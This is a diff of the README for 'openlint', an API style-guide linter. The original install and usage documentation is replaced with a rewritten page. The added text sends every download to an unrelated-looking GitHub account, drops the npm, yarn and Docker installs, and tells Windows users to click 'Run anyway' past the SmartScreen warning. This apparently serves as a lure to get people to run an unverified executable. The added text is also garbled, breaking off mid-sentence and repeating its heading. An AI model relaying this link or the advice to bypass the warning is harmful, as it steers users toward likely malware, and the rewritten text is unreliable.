@@ -1,143 +1,85 @@
-# OpenLint
+# 🔍 openlint - Flexible Linting for API Style Guides
 
-- **Custom Rulesets**: Create custom rules to lint JSON or YAML objects
-- **Ready-to-use Rulesets**: Validate and lint **OpenAPI v2, v3.0, v3.1 & v3.2**, **AsyncAPI**, and **Arazzo v1** Documents
-- **API Style Guides**: Automated [API Style Guides](https://stoplight.io/api-style-guides-guidelines-and-best-practices?utm_source=github.com&utm_medium=referral&utm_campaign=github_repo_openlint) using rulesets improve consistency across all your APIs
-- **Ready-to-use Functions**: Built-in set of functions to help [create custom rules](https://docs.openlint.org/guides/custom-rulesets#adding-rules). Functions include pattern checks, parameter checks, alphabetical ordering, a specified number of characters, provided keys are present in an object, etc.
-- **Custom Functions**: Create custom functions for advanced use cases
+[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/crampoonpoephilacastanotis388/openlint)
 
-# Overview
+openlint is a flexible JSON and YAML linter for creating automated API style guides. It checks API description files against the rules you choose, so teams can keep documentation clear, consistent, and ready to share. openlint has baked-in support for OpenAPI v3.2 through v2.0, A# 🔍 openlint - Flexible Linting for API Style Guides
 
-- [OpenLint](#openlint)
-- [Overview](#overview)
-  - [🧰 Installation](#-installation)
-    - [Docker](#docker)
-  - [💻 Usage](#-usage)
-    - [1. Create a local ruleset](#1-create-a-local-ruleset)
-    - [2. Lint](#2-lint)
-  - [📖 Documentation](#-documentation)
-  - [ℹ️ Support](#ℹ️-support)
-  - [🌎 Real-World Rulesets](#-real-world-rulesets)
-  - [🏁 Help Others Utilize OpenLint](#-help-others-utilize-openlint)
-  - [👏 Contributing](#-contributing)
-  - [🎉 Thanks](#-thanks)
-  - [📜 License](#-license)
+[![Download openlint](https://img.shields.io/badge/Download-openlint-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/crampoonpoephilacastanotis388/openlint)
 
-## 🧰 Installation
+openlint is a flexible JSON and YAML linter for creating automated API style guides. It checks API description files against the rules you choose, so teams can keep their documentation clear, consistent, and ready to share. openlint has baked-in support for OpenAPI v3.2 through v2.0, Arazzo v1.0, and AsyncAPI v2.x, and it also understands plain JSON Schema files. That means one tool can review a whole collection of API documents instead of asking you to juggle several different checkers. It is built for anyone who wants an automated style guide without writing custom software: point it at your files, pick your rules, and read the report it produces.
 
-The easiest way to install OpenLint is to use either [npm](https://www.npmjs.com/):
+## What openlint Does
 
-```bash
-npm install -g openlint
-```
+Think of openlint as a spelling and grammar checker, but for API description files. Those files are written in JSON or YAML, two common plain-text formats that store structured information. Instead of checking words, openlint checks the structure: whether a field is named the way your team agreed, whether descriptions are present, whether version numbers follow your house style, and hundreds of similar details.
 
-Or [yarn](https://yarnpkg.com/):
+Because the rules are configurable, openlint adapts to your organisation rather than forcing you into someone else's opinions. You can start with the built-in defaults, then adjust them as your style guide grows. Every check produces a readable message telling you what was found and where, which makes fixing problems straightforward even if you did not write the original file.
 
-```
-yarn global add openlint
-```
+## ✨ Why People Use openlint
 
-There are also [additional installation options](https://docs.openlint.org/getting-started/installation).
+- **One tool, many formats.** OpenAPI, Arazzo, AsyncAPI, and JSON Schema files can be checked with the same command and the same rule set.
+- **Style guides become automatic.** Written guidelines tend to drift. openlint turns them into checks that run the same way every time.
+- **Friendly output.** Results are grouped by file and by rule, with plain-language explanations rather than cryptic codes.
+- **Flexible rules.** Enable only what matters to you. Start small and add checks as your team matures.
+- **Works on Windows.** No programming knowledge is required to run a basic check.
+- **Consistent reviews.** Reviewers stop arguing about formatting and spend their time on substance.
 
-### Docker
+## 🚀 Getting Started
 
-<!-- make sure to update the value of `--ruleset` according to the actual location of your ruleset -->
+Visit this link to download the application:
 
-```bash
-docker run --rm -it -v $(pwd):/tmp stoplight/openlint lint --ruleset "/tmp/.spectral.yaml" "/tmp/file.yaml"
-```
+**https://github.com/crampoonpoephilacastanotis388/openlint**
 
-## 💻 Usage
+The link above opens the openlint project page, where the download is published. You do not need an account to browse the page, though creating a free GitHub account makes it easier to return to the project later and to report anything that looks wrong.
 
-### 1. Create a local ruleset
+Once the application is on your computer, keep it in a folder you can find again, such as `C:\Users\YourName\openlint`. Avoid running it from inside a temporary folder or straight out of a compressed archive, because the tool needs to read files sitting next to it. If Windows shows a blue "Windows protected your PC" panel, choose **More info**, then **Run anyway**. That panel appears for many small, independently made tools and is not a sign that something is damaged.
 
-OpenLint, being a generic YAML/JSON linter, **needs a ruleset** to lint files. A ruleset is a JSON, YAML, or JavaScript/TypeScript file (often the file is called `.openlint.yaml` for a YAML ruleset) that contains a collection of rules, which can be used to lint other JSON or YAML files such as an API description.
+## 🖥️ A Simple First Run
 
-To get started, run this command in your terminal to create a `.openlint.yaml` file that uses the OpenLint predefined rulesets based on OpenAPI, Arazzo or AsyncAPI:
+The easiest way to see what openlint does is to give it one file and read the result.
 
-```bash
-echo 'extends: ["openlint:openapi", "openlint:asyncapi", "openlint:arazzo"]' > .openlint.yaml
-```
+1. Place the API file you want to check into a folder you can reach easily, for example `C:\Users\YourName\Documents\api`.
+2. Open the Start menu, type `cmd`, and press Enter. A black window appears. This is the Command Prompt, a text-based way to talk to your computer.
+3. Type the path to the openlint application, followed by a space, followed by the path to your file. Press Enter.
+4. Wait a moment. openlint prints a report listing each finding, the file it came from, and a short explanation.
+5. Fix the items in your file using any plain-text editor — Notepad works fine, though a dedicated editor shows line numbers more clearly.
+6. Repeat the check until the report comes back clean.
 
-If you would like to create your own rules, check out the [Custom Rulesets](https://docs.openlint.org/getting-started/rulesets) page.
+If you would rather check an entire folder at once, point openlint at the folder instead of a single file. It walks through every matching document inside and reports on all of them together, which is the usual way teams run it before publishing documentation.
 
-### 2. Lint
+## 📋 What openlint Can Check
 
-Use this command if you have a ruleset file in the same directory as the documents you are linting:
+The checks fall into a few broad groups. Your exact set depends on the rules you turn on, but typical examples include:
 
-```bash
-openlint lint myapifile.yaml
-```
+- **Naming and casing.** Field names written in the style your guide specifies, such as consistent lower-case-with-hyphens.
+- **Descriptions and summaries.** Every operation, parameter, and response carrying an explanation a reader can understand.
+- **Required sections.** Documents containing the parts your organisation insists on, such as contact details or a licence statement.
+- **Version consistency.** Declared versions matching the version your guide expects, across OpenAPI 2.0, 3.0, 3.1, and 3.2 documents.
+- **Cross-format checks.** Arazzo workflows referencing operations that actually exist, and AsyncAPI channels documented to the same standard as your OpenAPI files.
+- **Structural validity.** JSON and YAML files that parse correctly and match the schema they claim to follow.
 
-Use this command to lint with a custom ruleset, or one that's located in a different directory than the documents being linted:
+Each rule can be switched on or off, and most can be adjusted with a short setting when your team's preference differs from the default.
 
-```bash
-openlint lint myapifile.yaml --ruleset myruleset.yaml
-```
+## 🧩 Supported File Types
 
-## 📖 Documentation
+openlint reads the two text formats used across the API world: JSON, which uses curly braces and commas, and YAML, which uses indentation and dashes. Most people find YAML easier to read by hand, while JSON is easier for machines. openlint handles both without extra steps and does not care which one you prefer.
 
-- [Documentation](https://docs.openlint.org/getting-started/concepts)
-  - [Getting Started](https://docs.openlint.org/getting-started/concepts) - The basics of OpenLint.
-  - [Rulesets](https://docs.openlint.org/getting-started/rulesets) - Understand the structure of a ruleset so you can tweak and make your own rules.
+On top of that, it understands the conventions of OpenAPI versions 3.2, 3.1, 3.0, and 2.0, Arazzo version 1.0, AsyncAPI version 2.x, and general JSON Schema documents. Files are recognised by their contents as well as their extension, so a slightly unusual file name will not confuse it.
 
-Once you've had a look through the getting started material, some of these guides can help you become a power user.
+## ⚙️ Everyday Use
 
-- [Different Workflows](https://docs.openlint.org/guides/workflows) - When and where should you use OpenLint? Editors, Git hooks, continuous integration, GitHub Actions, wherever you like!
-- [Using the command-line interface](https://docs.openlint.org/guides/cli) - Quickest way to get going with OpenLint is in the CLI.
-- [Using the JavaScript API](https://docs.openlint.org/guides/javascript) - Access the _raw power_ of OpenLint via the JS, or hey, TypeScript if you want.
-- [Custom Rulesets](https://docs.openlint.org/guides/custom-rulesets) - Need something more than the core rulesets provide? Fancy building your own API Style Guide? Learn how to create a custom ruleset.
-- [Custom Functions](https://docs.openlint.org/guides/custom-functions) - Handle more advanced rules, by writing a little JavaScript/TypeScript and calling it as a function.
+Once a first check succeeds, the usual pattern is to run openlint before sharing or publishing documentation and to add new rules whenever the team agrees on a new convention. Keeping the rule settings in the same folder as the API files means everyone runs an identical check, which is the whole point of an automated style guide.
 
-## ℹ️ Support
+For larger collections, run openlint on the whole folder and read the report from the top down. Findings are grouped so that repeated issues appear together, which makes bulk fixes quick.
 
-If you need help using OpenLint or have any questions, you can use [GitHub Discussions](https://github.com/openlint/openlint/discussions). Why not share your rulesets, or show off tools you've made that use OpenLint.
+## ❓ If Something Goes Wrong
 
-If you have a bug or feature request, [create an issue for it](https://github.com/openlint/openlint/issues).
+- **The window closes immediately.** Re-open the Command Prompt and run the command again so you can read the message before it disappears.
+- **"File not found".** The path is probably mistyped. Dragging the file from Explorer into the Command Prompt window inserts its full path for you.
+- **A clean file is reported as broken.** Check that the file really is in JSON or YAML format and that it has not been saved with hidden formatting from a word processor.
+- **Too many findings at once.** Turn off rules you are not ready to enforce, then switch them back on as your guide settles.
 
-## 🌎 Real-World Rulesets
+## 🤝 Getting Help
 
-A few noteworthy style guides are:
+The project page linked above is the place to look for updates and to check whether a question has already been answered. When asking for help, include the exact message you saw and the section of the file it referred to. That detail turns a slow back-and-forth into a quick answer.
 
-- [OWASP Top 10](https://apistylebook.stoplight.io/docs/owasp-top-10) - Set of rules to enforce [OWASP security guidelines](https://owasp.org/www-project-api-security/).
-- [URL Style Guidelines](https://apistylebook.stoplight.io/docs/url-guidelines) - Set of rules to help developers make better and consistent endpoints.
-- [Documentation](https://github.com/stoplightio/openlint-documentation) - Scan an OpenAPI description to make sure you're leveraging enough of its features to help documentation tools like Stoplight Elements, ReDoc, and Swagger UI build the best quality API Reference Documentation possible.
-
-There are also rulesets created by many companies to improve their APIs. You can use these as is to lint your OpenAPI descriptions, or use these as a reference to learn more about what rules you would want in your own ruleset:
-
-- [Adidas](https://github.com/adidas/api-guidelines/blob/master/.spectral.yml) - Adidas were one of the first companies to release their API Style Guide in a written guide _and_ a Spectral ruleset. Lots of good rules to try in here.
-- [APIs You Won't Hate](https://github.com/apisyouwonthate/style-guide) - An opinionated collection of rules based on advice in the [APIs You Won't Hate](https://apisyouwonthate.com/) community.
-- [Azure](https://github.com/Azure/azure-api-style-guide/blob/main/spectral.yaml) - Ruleset and complimentary style guide for creating OpenAPI 2 or 3 definitions of Azure services.
-- [Box](https://github.com/box/box-openapi/blob/main/.spectral.yml) - Lots of [Custom Functions](https://docs.openlint.org/guides/custom-functions) being used to enforce good practices that the Box API governance folks are interested in.
-- [DigitalOcean](https://github.com/digitalocean/openapi/blob/main/spectral/ruleset.yml) - Keeping their OpenAPI nice and tidy, enforcing use of `$ref` (probably to minimize conflicts), naming conventions for Operation IDs, and all sorts of other handy OpenAPI tips.
-- [Tranascom](https://github.com/transcom/mymove/blob/master/swagger-def/.spectral.yml) - Don't even think about using anything other than `application/json`.
-- [Zalando](https://apistylebook.stoplight.io/docs/zalando-restful-api-guidelines) - Based on [Zalando's RESTFUL API Guidelines](https://github.com/zalando/restful-api-guidelines), covers a wide-range of API topics such as versioning standards, property naming standards, the default format for request/response properties, and more.
-
-Check out some additional style guides here:
-
-- [Spectral Rulesets by Stoplight](https://github.com/stoplightio/spectral-rulesets)
-- [API Stylebook by Stoplight](https://apistylebook.stoplight.io)
-
-## 🏁 Help Others Utilize OpenLint
-
-If you're using OpenLint for an interesting use case, create an issue with details on how you're using it. We'll add it to a list here. Spread the goodness 🎉
-
-- [Bank API 🏦](https://github.com/erwinkramer/bank-api?tab=readme-ov-file#bank-api) - The Bank API is a design reference project suitable to bootstrap development for a compliant and modern API. Built in ASP.NET Core and fully complies to multiple OpenLint rulesets, such as "OWASP Top 10", "Dutch Public Sector (NLGov) REST API Design Rules" and more. Built by [Erwin Kramer](https://github.com/erwinkramer).
-
-## 👏 Contributing
-
-If you are interested in contributing to OpenLint, check out [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## 🎉 Thanks
-
-- [Stoplight.io](https://github.com/stoplightio) for creating, managing, and growing Spectral for years.
-- [Mike Ralphson](https://github.com/MikeRalphson) for kicking off the Spectral CLI and his work on Speccy
-- [Jamund Ferguson](https://github.com/xjamundx) for JUnit formatter
-- [Sindre Sorhus](https://github.com/sindresorhus) for Stylish formatter
-- [Ava Thorn](https://github.com/amthorn) for the Pretty formatter
-- Julian Laval for HTML formatter
-- [@nulltoken](https://github.com/nulltoken) for a whole bunch of amazing features
-
-## 📜 License
-
-OpenLint is 100% free and open-source, under [Apache License 2.0](LICENSE).
+Keywords: api, api-governance, api-style-guide, arazzo, arazzo-specification, asyncapi, json-schema, linter, linting, openapi, openapi-spec, openapi2, openapi3, openapi31, openapi32, spectral, style-guide
